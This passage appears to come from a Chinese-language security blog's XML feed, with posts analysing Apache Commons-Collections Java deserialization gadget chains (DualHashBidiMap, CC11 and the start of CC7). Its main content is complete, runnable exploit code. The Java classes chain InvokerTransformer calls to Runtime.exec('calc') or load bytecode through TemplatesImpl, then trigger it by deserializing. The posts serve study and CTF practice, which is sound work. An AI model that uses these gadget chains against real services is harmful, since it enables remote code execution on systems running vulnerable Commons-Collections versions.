punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DualTreeBidiMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> dualTreeBidiMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DualTreeBidiMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">,</span> transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        dualTreeBidiMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> iTransformers <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 序列化</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>dualTreeBidiMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 反序列化</span>        <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 DualHashBidiMap 链</title>
      <link href="/2023/01/30/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-dualhashbidimap-lian/"/>
      <url>/2023/01/30/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-dualhashbidimap-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-DualHashBidiMap-链"><a href="#Java-反序列化-Commons-Collections-篇-DualHashBidiMap-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 DualHashBidiMap 链"></a>Java 反序列化 Commons-Collections 篇 DualHashBidiMap 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>在 CTFSHOW 训练时得知还存在这个链子，主要使用 DualHashBidiMap 来触发 TiedEntryMap.hashCode()</p><p>影响范围 commons-collections 3.1 - 3.2.1 且不受 java 版本限制</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li><p>java 1.8.0_352</p></li><li><p>commons-collections 3.2.1</p></li></ul><h2 id="3-DualHashBidiMap-链分析"><a href="#3-DualHashBidiMap-链分析" class="headerlink" title="3. DualHashBidiMap 链分析"></a>3. DualHashBidiMap 链分析</h2><p>还是首先到 DualHashBidiMap.readObject 看看</p><p><img src="/../../../../../pic/image-20230130161017246.png"></p><p>初始化 maps[0] 与 maps[1] 为 HashMap 然后调用 putAll() 方法，DualHashBidiMap 下并没有实现该方法，寻找其父类 AbstractDualBidiMap</p><p><img src="/../../../../../pic/image-20230130161134430.png"></p><p>遍历传入的 map，然后调用 put() 方法进行处理，继续跟进查看 put() 方法</p><p><img src="/../../../../../pic/image-20230130161210930.png"></p><p>调用了 HashMap.containsKey() 方法处理 key，看一下 HashMap.containsKey() 的处理方式</p><p><img src="/../../../../../pic/image-20230130161348150.png"></p><p>丢到了 hash 中进行处理，可以在此处触发 hashCode 方法，可以拿 CC6 链修改一下</p><h3 id="3-1-利用链"><a href="#3-1-利用链" class="headerlink" title="3.1 利用链"></a>3.1 利用链</h3><pre class="line-numbers language-none"><code class="language-none">DualHashBidiMap.readObject()DualHashBidiMap.putAll()DualHashBidiMap.put()HashMap.containsKey()HashMap.hash()TiedMapEntry.hashCode()TiedMapEntry.getValue()LazyMap.get()ChainedTransformer.transform()InvokerTransformer.transform()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-DualHashBidiMap-链-EXP-编写"><a href="#4-DualHashBidiMap-链-EXP-编写" class="headerlink" title="4. DualHashBidiMap 链 EXP 编写"></a>4. DualHashBidiMap 链 EXP 编写</h2><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.bidimap.DualHashBidiMap;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Exploit {    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {        // 命令执行        Transformer[] transformers = {                new ConstantTransformer(Runtime.class),                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),        };        // 防止在 put 时执行        Transformer[] fakeTransformers = {};        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);        // 实例化 lazyMap        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);        // 实例化 tiedMapEntry        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");        // 利用 HashMap 触发 hashCode        HashMap&lt;Object, Object&gt; expHashMap = new HashMap&lt;&gt;();        expHashMap.put("key", tiedMapEntry);        DualHashBidiMap dualHashBidiMap = new DualHashBidiMap(expHashMap);        // 利用反射修改为正确值        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");        iTransformers.setAccessible(true);        iTransformers.set(chainedTransformer, transformers);        // 清除 put 对 lazyMap 的影响        lazyMap.clear();        // 执行序列化与反序列化        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(dualHashBidiMap);        objectOutputStream.flush();        objectOutputStream.close();        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        objectInputStream.readObject();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><p><a href="https://www.anquanke.com/post/id/232415">Java反序列化之与JDK版本无关的利用链挖掘</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 CC11 链</title>
      <link href="/2023/01/30/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc11-lian/"/>
      <url>/2023/01/30/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc11-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-CC11-链"><a href="#Java-反序列化-Commons-Collections-篇-CC11-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 CC11 链"></a>Java 反序列化 Commons-Collections 篇 CC11 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>CC11 更像是 CC2 与 CC6 的结合，主要是用于避免Shiro-550反序列化时的一个问题：<strong>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。</strong></p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li><p>java 17.0.5</p></li><li><p>commons-collections 3.2.1</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="3-CC11-链-EXP-编写"><a href="#3-CC11-链-EXP-编写" class="headerlink" title="3. CC11 链 EXP 编写"></a>3. CC11 链 EXP 编写</h2><p>东拼西凑一下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token comment">// CC2 部分加载字节码</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绕过 if 确保进入</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_class"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 写入字节码</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// CC6 部分</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> expHashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"factory"</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 执行序列化与反序列化</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expHashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Field</span> targetField <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h2><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/commonscollections11%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">CommonsCollections11利用链分析</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 CC7 链</title>
      <link href="/2023/01/28/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc7-lian/"/>
      <url>/2023/01/28/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc7-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-CC7-链"><a href="#Java-反序列化-Commons-Collections-篇-CC7-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 CC7 链"></a>Java 反序列化 Commons-Collections 篇 CC7 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>没错，LazyMap.get() 他又来了，这次又搞了个新姿势来调用他</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li>java 8u65</li><li>commons-collections 3.2.1</li><li>maven 3.8.7</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;commons-collections&lt;/groupId&gt;    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-CC7-链分析"><a href="#3-CC7-链分析" class="headerlink" title="3. CC7 链分析"></a>3. CC7 链分析</h2><p>CC7 关键利用点在于 Hashtable 的哈希碰撞检测，先从 readObject 开始</p><p><img src="/../../../../../pic/image-20230128193359214.png"></p><p>依次读取出写入 Hashtable 中的 key 与 value 然后丢给 reconstitutionPut 处理</p><p><img src="/../../../../../pic/image-20230128204813463.png"></p><p>先是获取传入 key 的 hashCode（警觉，试了一下修改 CC6 的链确实可以），然后判断在 tab 中是否存在 key 的 hashCode，有的情况下会执行对应的 equals 方法对比 key 的值是否相同，如果相同的话会扔出一个错误（已经有了你还插入干啥！），最后将  key 的 hashCode 插入到 tab 中</p><p>这里的目标方法是去执行 equals 方法，所以需要实现 hash 碰撞（hashCode 值相同但原值不同）</p><p>刚好在 java 中 